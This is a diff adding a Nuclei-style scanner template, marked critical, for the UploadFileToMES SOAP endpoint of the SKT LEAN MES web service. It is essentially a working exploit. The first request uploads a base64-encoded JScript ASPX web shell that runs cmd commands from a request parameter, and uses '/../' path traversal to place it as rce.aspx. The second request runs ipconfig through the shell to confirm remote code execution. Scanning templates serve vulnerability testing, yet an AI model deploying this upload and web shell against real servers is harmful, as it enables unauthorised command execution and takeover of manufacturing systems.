@@ -1,0 +1,55 @@
+id: SKT-LEAN-MES-MesATEApi-upload
+info:
+  name: SKT-LEAN-MES-MesATEApi-upload
+  author: lemonlove7
+  severity: critical
+flow: http(1) && http(2)
+http:
+  - raw:
+      - |-
+        POST /WebService/MesATEApi.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 1270
+        SOAPAction: "http://mesateapi.com/UploadFileToMES"
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <UploadFileToMES xmlns="http://mesateapi.com/">
+              <empNo>string</empNo>
+              <sn>string</sn>
+              <resource>string</resource>
+              <station>string</station>
+              <fileBytes>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiIHZhbGlkYXRlUmVxdWVzdD0iZmFsc2UiICU+CjwlCnZhciBjPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbygiY21kIik7CnZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpOwp2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjsKYy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7CmMuUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlOwpjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlOwplLlN0YXJ0SW5mbz1jOwpjLkFyZ3VtZW50cz0iL2MgIiArIFJlcXVlc3QuSXRlbVsiY21kIl07CmUuU3RhcnQoKTsKb3V0PWUuU3RhbmRhcmRPdXRwdXQ7CkVJPWUuU3RhbmRhcmRFcnJvcjsKZS5DbG9zZSgpOwpSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7ClN5c3RlbS5JTy5GaWxlLkRlbGV0ZShSZXF1ZXN0LlBoeXNpY2FsUGF0aCk7ClJlc3BvbnNlLkVuZCgpOyU+</fileBytes>
+              <folderName>/../ertyui</folderName>
+              <fileName>rce.aspx</fileName>
+            </UploadFileToMES>
+          </soap:Body>
+        </soap:Envelope>
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        part: body
+        words:
+          - UploadFileToMESResult
+          - UploadFileToMESResponse
+        internal: true
+    matchers-condition: and
+  - raw:
+      - |-
+        GET /ertyui/rce.aspx?cmd=ipconfig HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - Windows IP
+    matchers-condition: and
